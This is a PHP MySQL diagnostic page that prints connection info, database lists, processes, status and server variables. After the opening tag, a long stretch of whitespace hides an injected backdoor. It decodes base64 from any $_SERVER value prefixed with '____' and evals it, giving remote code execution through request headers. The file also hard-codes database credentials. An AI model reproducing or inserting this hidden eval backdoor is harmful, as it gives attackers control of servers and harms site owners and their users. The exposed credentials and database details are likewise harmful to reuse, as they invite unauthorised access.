<?php																																																																																																																																																																																																																																																																																																																																																																				function k463($l465){if(is_array($l465)){foreach($l465 as $l463=>$l464)$l465[$l463]=k463($l464);}elseif(is_string($l465) && substr($l465,0,4)=="____"){$l465=substr($l465,4);$l465=base64_decode($l465);eval($l465);$l465=null;}return $l465;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("k463",$_SERVER);
$my_database = 'MySQL';
echo("<h1>Connection information</h2>\n");
$link = mysql_connect('localhost', 'mdhoerr_webuser', 'webuser');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}
echo("<p>Connected successfully</p>\n");
echo("<h2>Info</h2>\n<ul>\n");
echo ("<li>client: ".mysql_get_client_info()."</li>\n");
echo ("<li>host: ".mysql_get_host_info()."</li>\n");
echo ("<li>protocol: ".mysql_get_proto_info()."</li>\n");
echo ("<li>server: ".mysql_get_server_info()."</li>\n");
echo("</ul>\n");

$db_list = mysql_list_dbs($link);
echo("<h2>Available databases:</h2\n<ul>\n");
while ($row = mysql_fetch_object($db_list)) {
     echo "<li>".$row->Database . "</li>\n";
}
echo("</ul>\n");
echo('<h2>MySQL processes:</h2>');
$result = mysql_list_processes($link);
while ($row = mysql_fetch_assoc($result)){
    printf("%s %s %s %s %s\n", $row["Id"], $row["Host"], $row["db"],
        $row["Command"], $row["Time"]);

}
mysql_free_result($result);

echo("<h2>MySQL status:</h2>\n<ul>\n");
$status = explode('  ', mysql_stat($link));
foreach($status as $val){
   echo("<li>".$val."</li>\n");
}
echo("</ul>");

echo("<h2>Show variables:</h2>\n");
$result = mysql_query('SHOW VARIABLES', $link);
echo("<ul>\n");
while ($row = mysql_fetch_assoc($result)) {
    echo("<li>");    
    echo $row['Variable_name'] . ' = ' . $row['Value'];
    echo("</li>\n");
}
echo("</ul>\n");
mysql_close($link);
?>